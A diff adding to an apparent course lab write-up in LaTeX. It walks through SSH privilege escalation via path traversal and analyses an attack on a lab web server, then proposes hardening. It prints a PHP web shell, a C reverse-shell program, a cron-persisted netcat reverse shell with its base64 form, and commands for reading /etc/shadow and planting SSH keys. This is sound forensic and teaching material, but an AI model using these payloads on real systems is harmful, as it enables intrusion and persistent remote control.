@@ -37,7 +37,7 @@
       \begin{Verbatim}[frame=single]
 ssh: connect to host 10.0.2.17 port 22: Connection refused
       \end{Verbatim}
-      \item Run \verb|nmap -v -sV 10.0.2.17| to scan open ports on \verb|nasa_hw11_red|. We discover that the SSH service actually runs on
+      \item Run \verb|nmap -v -sV -p1-65535 10.0.2.17| to scan open ports on \verb|nasa_hw11_red|. We discover that the SSH service actually runs on
       port 22087.
       \begin{Verbatim}[frame=single, commandchars=\\\{\}]
 PORT      STATE SERVICE         VERSION
@@ -196,7 +196,7 @@ Change: 2024-05-09 22:33:13.406666636 +0800
       user input \verb|comic_name| is append after \verb|path|. Therefore, we can
       engineer \verb|comic_name| to contain multiple leading \verb|../|'s to access
       any file as root.
-      \item Run \verb|/root/comic-server/comic-server|. Choose \verb|2. Read a comic| and
+      \item Run \verb|/root/comic-server/comic-server|. ``Choose \verb|2. Read a comic|" and
       type in \verb|../../../etc/shadow| as the comic name. This allows us to see the
       content of \verb|/etc/shadow| and therefore obtain nasa2024's hashed password.
       \begin{Verbatim}[frame=single, fontsize=\scriptsize, breaklines, breakanywhere, breakanywheresymbolpre=]
@@ -315,7 +315,7 @@ $ LD_PRELOAD=/home/nasa2023/fake_uid.so ./flag4
     \begin{enumerate}[label=(\arabic*)]
       \item With SSH's public key authentication, we can login without the password.\\
       So, we write the contents of \verb|/home/student/.ssh/authorized_keys| to \\
-      \verb|/root/.ssh/authorized_keys| using the \verb|3. Submit a comic| functionality of \\
+      \verb|/root/.ssh/authorized_keys| using the ``\verb|3. Submit a comic|" functionality of \\
       \verb|/root/comic-server/comic-server|.
       \begin{Verbatim}[frame=single, fontsize=\scriptsize, breaklines]
 $ cat /home/student/.ssh/authorized_keys
@@ -343,5 +343,267 @@ $ ssh -p 22087 -i id_e25519 root@10.0.2.17
     \textbf{Result}
 
     \includegraphics[width=\linewidth]{1-e_result.png}
+  \end{enumerate}
+
+  \pagebreak
+  \section{Red Team}
+  \begin{enumerate}[label=(\alph*)]
+    \item \textbf{Steps}
+
+    Run \verb|nmap -v -sV -p1-65535 10.0.2.18| to scan open ports on \verb|nasa_hw11_blue|.
+
+    \textbf{Result}
+
+    An SSH service and an HTTP service are discovered.
+
+    \begin{Verbatim}[frame=single]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
+80/tcp open  http    nginx
+    \end{Verbatim}
+
+    \item \textbf{Steps}
+    \begin{enumerate}[label=(\arabic*)]
+      \item Login to \verb|nasa_hw11_blue| with \verb|/home/nasa2024/.ssh/id_blue|.
+      \item Inspect the access log of nginx: \verb|/var/log/nginx/access.log|.
+      We suspect that some malicious user is trying to execute system commands
+      through PHP injection.
+      \item Inspect the PHP script that the user uploaded:\\ \verb|/var/www/html/uploads/662f9a8dc30bb.php|.\\
+      Our guess was indeed correct.
+    \end{enumerate}
+
+    \textbf{Result}
+
+    The service being attacked is the PHP backend of the HTTP service.
+
+    \begin{Verbatim}[frame=single, fontsize=\scriptsize, breaklines]
+# less /var/log/nginx/access.log
+10.0.2.29 - - [29/Apr/2024:21:03:23 +0800] "GET /uploads/662f9a8dc30bb.php?cmd=ls HTTP/1.1" 200 341 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
+10.0.2.29 - - [29/Apr/2024:21:03:28 +0800] "GET /uploads/662f9a8dc30bb.php?cmd=ls%20/ HTTP/1.1" 200 106 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
+10.0.2.29 - - [29/Apr/2024:21:05:44 +0800] "GET /uploads/662f9a8dc30bb.php?cmd=ls%20/ HTTP/1.1" 200 106 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
+# cat /var/www/html/uploads/662f9a8dc30bb.php
+<?php
+system($_GET['cmd']);
+?>
+    \end{Verbatim}
+
+    \item \textbf{Steps}
+
+    Inspect \verb|/var/log/nginx/access.log|.
+
+    \textbf{Result}
+
+    The IP address of the attacker is \verb|10.0.2.29|.
+
+    \item The primary vulnerablility of this HTTP service lies in \verb|upload.php|.
+    It allows anybody to upload arbitrary files, including malicious PHP scripts.
+
+    In this case, the attacker uploaded a PHP scripts that calls the \verb|system()|
+    function. They are attempting to access the system's shell. \verb|$_GET['cmd']|
+    allows them to potentially execute any command by providing
+    \verb|?cmd=...| in the URL. What's more scary is that the uploaded files are
+    owned by root, so any executable could be run as root.
+
+    \textbf{References}
+    \begin{itemize}
+      \item \href{https://www.php.net/manual/en/function.system.php}{PHP: system - Manual}
+    \end{itemize}
+
+    \pagebreak
+    \item \textbf{Result}
+    \begin{enumerate}[label=(\arabic*)]
+      \item From the access log, we can see that the attacker is trying to
+      inject malicious C code and scripts into the system. If we decode the
+      base64 string, we see some code that opens a network socket to \verb|10.0.2.20|
+      and gain shell access.
+      \begin{minted}[fontsize=\scriptsize]{c}
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = 9001;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.0.2.20");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"ash", NULL};
+    execvp("ash", argv);
+
+    return 0;
+}
+      \end{minted}
+
+      \item However, this doesn't seem to be the only attack. Later down
+      the access log, we see some shell script being injected, while also
+      modifying crontab.
+      \begin{Verbatim}[frame=single, fontsize=\scriptsize, breaklines, breakanywhere, breakanywheresymbolpre=]
+10.0.2.29 - - [23/Apr/2024:12:25:02 +0800] "GET /uploads/662f9a8dc30bb.php?cmd=echo%20%220%20*%20*%20*%20*%20echo%20%23!1%2Fbin%2Fash%0Awhile%20true%3B%20do%0A%20%20nc%2010.0.2.29%209001%20-e%20ash%0A%20%20sleep%205%0Adone%20%3E%20/var/www/html/uploads/a.sh%20&&%20chmod%20777%20/var/www/html/uploads/a.sh%20&&%20/var/www/html/uploads/a.sh%22%20|%20crontab%20- HTTP/1.1" 200 5 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
+      \end{Verbatim}
+      If we decode the percent-encoded query string, we see the command.
+      \begin{Verbatim}[frame=single, fontsize=\small, breaklines]
+echo "0 * * * * echo #!1/bin/ash\nwhile true; do\n  nc 10.0.2.29 9001 -e ash\n  sleep 5\ndone > /var/www/html/uploads/a.sh && chmod 777 /var/www/html/uploads/a.sh && /var/www/html/uploads/a.sh" | crontab
+      \end{Verbatim}
+
+      By writing the command to crontab, \verb|/var/www/html/uploads/a.sh| is generated and
+      executed every hour.
+
+      This \verb|a.sh| tries to open a TCP tunnel to the attacker \verb|10.0.2.29:9001|
+      every 5 seconds, meanwhile gaining shell access via nc's option \verb|-e ash|.
+      \begin{Verbatim}[frame=single]
+#!1/bin/ash
+while true; do
+  nc 10.0.2.29 9001 -e ash
+  sleep 5
+done
+      \end{Verbatim}
+    \end{enumerate}
+
+    \pagebreak
+    \textbf{Side note}
+
+    If we inspect crontab or \verb|a.sh|, we see that the command is base64-encoded.
+    This isn't seen in the access log, and there are no signs of decoding the contents
+    and then executing it.
+    \begin{Verbatim}[frame=single, fontsize=\small, breaklines, breakanywhere, breakanywheresymbolpre=]
+# crontab -l
+0 * * * * echo IyExL2Jpbi9hc2gKd2hpbGUgdHJ1ZTsgZG8KICBuYyAxMC4wLjIuMjkgOTAwMSAtZSBhc2gKICBzbGVlcCA1CmRvbmUK > /var/www/html/uploads/a.sh && chmod 777 /var/www/html/uploads/a.sh && ash a.sh &
+# cat /var/www/html/uploads/a.sh
+IyExL2Jpbi9hc2gKd2hpbGUgdHJ1ZTsgZG8KICBuYyAxMC4wLjIuMjkgOTAwMSAtZSBhc2gKICBzbGVlcCA1CmRvbmUK
+# base64 -d /var/www/html/uploads/a.sh
+#!1/bin/ash
+while true; do
+  nc 10.0.2.29 9001 -e ash
+  sleep 5
+done
+    \end{Verbatim}
+
+    \textbf{References}
+    \begin{itemize}
+      \item \href{https://crontab.guru/#0_*_*_*_*}{Crontab.guru - The cron schedule expression generator}
+    \end{itemize}
+
+    \pagebreak
+    \item To prevent this type of attack, we can deny uploads of PHP scripts by
+    checking the file extension.
+    \begin{minted}[fontsize=\small, breaklines]{diff}
+--- upload.php
++++ upload_deny_php.php
+@@ -11,6 +11,11 @@
+
+     $uploadedFileName = $uploadedFile['name'];
+     $uploadedFileExtension = strtolower(pathinfo($uploadedFileName, PATHINFO_EXTENSION));
++    if (strtolower($uploadedFileExtension) == 'php') {
++        echo "Cannot upload php scripts.";
++        return;
++    }
++
+     $uniqueFileName = uniqid() . '.' . $uploadedFileExtension;
+     $destination = $uploadDir . '/' . $uniqueFileName;
+    \end{minted}
+
+    Or more strictly, we could limit the file extension checking to only a fixed
+    set of known image file formats.
+    \begin{minted}[fontsize=\small, breaklines]{diff}
+--- upload.php
++++ upload_only_image.php
+@@ -11,6 +11,12 @@
+
+     $uploadedFileName = $uploadedFile['name'];
+     $uploadedFileExtension = strtolower(pathinfo($uploadedFileName, PATHINFO_EXTENSION));
++    $supportedImageExtensions = array('apng', 'avif', 'gif', 'jpg', 'jpeg', 'jfif', 'png', 'svg', 'webp');
++    if (!in_array(strtolower($uploadedFileExtension), $supportedImageExtensions)) {
++        echo "File format unsupported.";
++        return;
++    }
++
+     $uniqueFileName = uniqid() . '.' . $uploadedFileExtension;
+     $destination = $uploadDir . '/' . $uniqueFileName;
+    \end{minted}
+
+    \textbf{References}
+    \begin{itemize}
+      \item \href{https://www.php.net/manual/en/function.system.php}{PHP: system - Manual}
+      \item \href{https://www.php.net/manual/en/reserved.variables.files.php}{PHP: \$\_FILES - Manual}
+      \item \href{https://www.php.net/manual/en/features.file-upload.post-method.php}{PHP: POST method uploads - Manual}
+      \item \href{https://www.php.net/manual/en/function.in-array.php}{PHP: in\_array - Manual}
+      \item \href{https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types}{Image file type and format guide - Web media technologies | MDN}
+    \end{itemize}
+
+    \pagebreak
+    \item Run the PHP service as a separate user other than root, and use access
+    control lists to deny the user's access to \verb|/bin|, \verb|/sbin|,
+    \verb|/usr/bin| and \verb|/usr/sbin|.
+
+    \textbf{Steps}
+    \begin{enumerate}[label=(\arabic*)]
+      \item Create user \verb|php| for the PHP service.
+      \begin{Verbatim}[frame=single]
+# adduser -h /var/www/html -s /sbin/nologin php
+      \end{Verbatim}
+      \item Configure \verb|/etc/php82/php-fpm.d/www.conf|.
+      \begin{minted}[fontsize=\small, breaklines]{diff}
+--- www.conf
++++ www.conf
+@@ -25,5 +25,5 @@
+ ;       --allow-to-run-as-root option to work.
+ ; Default Values: The user is set to master process running user by default.
+ ;                 If the group is not set, the user's group is used.
+-user = root
+-group = root
++user = php
++group = php
+      \end{minted}
+      \item Recursively change ownership of \verb|/var/www/html|. Set permission
+      of all files to 644 and directories to 755.
+      \begin{Verbatim}[frame=single]
+# chown -R php:php /var/www/html
+# chmod -R 644 /var/www/html
+# chmod 755 /var/www/html /var/www/html/uploads
+      \end{Verbatim}
+      \item Use access control lists to deny \verb|php| from accessing \verb|/bin|,
+      \verb|/sbin|, \verb|/usr/bin| and \verb|/usr/sbin|.
+      \begin{Verbatim}[frame=single]
+# apk add acl
+
+# setfacl -m "u:php:---" /bin /sbin /usr/bin /usr/sbin
+
+# getfacl /bin
+getfacl: Removing leading '/' from absolute path names
+# file: bin
+# owner: root
+# group: root
+user::rwx
+user:php:---
+group::r-x
+mask::r-x
+other::r-x
+      \end{Verbatim}
+    \end{enumerate}
+
+    \pagebreak
+    \textbf{Result}
+
+    \includegraphics[width=\linewidth]{2-g_result.png}
+
+    \textbf{References}
+    \begin{itemize}
+      \item \href{https://stackoverflow.com/questions/10990/what-are-the-proper-permissions-for-an-upload-folder-with-php-apache}{What are the proper permissions for an upload folder with PHP/Apache? - Stack Overflow}
+      \item \href{https://wiki.archlinux.org/title/Access_Control_Lists}{Access Control Lists - ArchWiki}
+      \item \href{https://pkgs.alpinelinux.org/package/edge/main/x86_64/acl}{Alpine Linux packages - acl}
+    \end{itemize}
   \end{enumerate}
 \end{document}
